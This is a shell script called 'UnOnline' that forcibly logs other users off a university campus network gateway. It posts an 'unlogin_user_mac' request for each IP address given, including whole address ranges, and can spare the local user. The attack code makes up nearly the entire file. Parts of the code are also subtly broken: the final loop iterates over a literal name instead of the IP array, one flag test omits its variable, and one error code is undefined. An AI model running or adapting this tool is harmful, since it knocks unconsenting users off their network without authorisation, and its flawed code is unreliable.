#!/bin/sh
local_ip="`ifconfig | grep -w inet | grep -v 127.0.0.1 | cut -f 2 -d \":\" | cut -f 1 -d \" \"`"
param="action=unlogin_user_mac&error_type=&type=1&mac_ip="
flag_range=false
flag_self=true
ip_list=()

display_help() {
    echo "NOTICE: UnOnline depends on curl."
    echo "Usage: unonline [option] arg(s)"
    echo ""
    echo "Options: "
    echo "    -h/--help                             display this help"
    echo "    -r/--range <ip_addr_1> <ip_addr_2>    log off any user whoes ip address ranges from <ip_addr_1> to <ip_addr_2>"
    echo "        -x(when using option -r)          log off any user whoes ip address ranges from <ip_addr_1> to <ip_addr_2> except for the local user"
    echo "    -v/--version                          display the version of UnOnline"
    echo ""
    echo "Examples: "
    echo "    unonline 192.168.1.64"
    echo "    unonline 192.168.1.34 192.168.1.210 192.168.1.115"
    echo "    unonline -r 192.168.1.14 192.168.1.231 -x"
    echo ""
    exit 0
}

display_version() {
    echo "UnOnline v0.1.4 (built: Mar 21 2015)"
    echo "Author: EternalPhane"
    echo ""
    exit 0
}

error_handler() {
    case $1 in
        1)
            echo "Argument number error!" >&2
            exit 1
        ;;
        2)
            echo "Usage error: '-x' without '-r/--range'" >&2
            exit 2
        ;;
        3)
            echo "IP address cannot be resolved!" >&2
            exit 3
        ;;
        4)
            echo "Failed to connect!" >&2
            exit 4
        ;;
    esac
}

logoff() {
    curl -d $param+"$1" "gw.buaa.edu.cn/change_user_balance.php"
}

traverse() {
    check_ip=`curl -m 5 -o /dev/null -w %{http_code} -s ${1}`

    if [[ $? -eq 6 ]]; then
        error_handler 3
    fi

    ipAddr1=(0 0 0 $1)
    ipAddr2=(0 0 0 $2)

    for i in {0..2}
    do
        ipAddr1[$i]=${ipAddr1[3]%%.*}
        ipAddr2[$i]=${ipAddr2[3]%%.*}
        ipAddr1[3]=${ipAddr1[3]#*.}
        ipAddr2[3]=${ipAddr2[3]#*.}

        if [[ ${ipAddr1[$i]} -gt ${ipAddr2[$i]} ]]; then
            error_handler 5
        fi
    done

    while [[ "${ipAddr1[0]}.${ipAddr1[1]}.${ipAddr1[2]}.${ipAddr1[3]}" != "${ipAddr2[0]}.${ipAddr2[1]}.${ipAddr2[2]}.${ipAddr2[3]}" ]]
    do
        ip_list[${#ip_list[*]}]="${ipAddr1[0]}.${ipAddr1[1]}.${ipAddr1[2]}.${ipAddr1[3]}"
        ipAddr1[3]=$[${ipAddr1[3]}+1]

        if [[ ${ipAddr1[3]} -eq 256 ]]; then
            ipAddr1[2]=$[${ipAddr1[2]}+1]
            ipAddr1[3]=1

            if [[ ${ipAddr1[2]} -eq 256 ]]; then
                ipAddr1[1]=$[${ipAddr1[1]}+1]
                ipAddr1[2]=1

                if [[ ${ipAddr1[1]} -eq 256 ]]; then
                    ipAddr1[0]=$[${ipAddr1[0]}+1]
                    ipAddr1[1]=1
                fi
            fi
        fi
    done

    ip_list[${#ip_list[*]}]="${ipAddr1[0]}.${ipAddr1[1]}.${ipAddr1[2]}.${ipAddr1[3]}"
}

if [[ $# -eq 0 ]]; then
    display_help
fi

for (( i=1;i<=$#;i++ ))
do
    case ${!i} in
        "-h" | "--help")
            if [[ $# -ne 1 ]]; then
                error_handler 1
            else
                display_help
            fi
        ;;
        "-r" | "--range")
            if [[ $[$i+2] -gt $# ]]; then
                error_handler 1
            else
                flag_range=true
                tmp=($[$i+1] $[$i+2])
                traverse ${!tmp[0]} ${!tmp[1]}
                i=$[$i+2]
            fi
        ;;
        "-v" | "--version")
            if [[ $# -ne 1 ]]; then
                error_handler 1
            else
                display_version
            fi
        ;;
        "-x")
            if [[ flag_range = false ]]; then
                error_handler 2
            else
                flag_self=false
            fi
        ;;
        *)
            check_ip=`curl -m 5 -o /dev/null -w %{http_code} -s ${!i}`

            if [[ $? -eq 6 ]]; then
                error_handler 3
            elif [[ check_ip -gt 202 ]]; then
                error_handler 4
            else
                ip_list[${#ip_list[*]}]=${!i}
            fi
    esac
done

for ip in ip_list
do
    logoff $ip
done
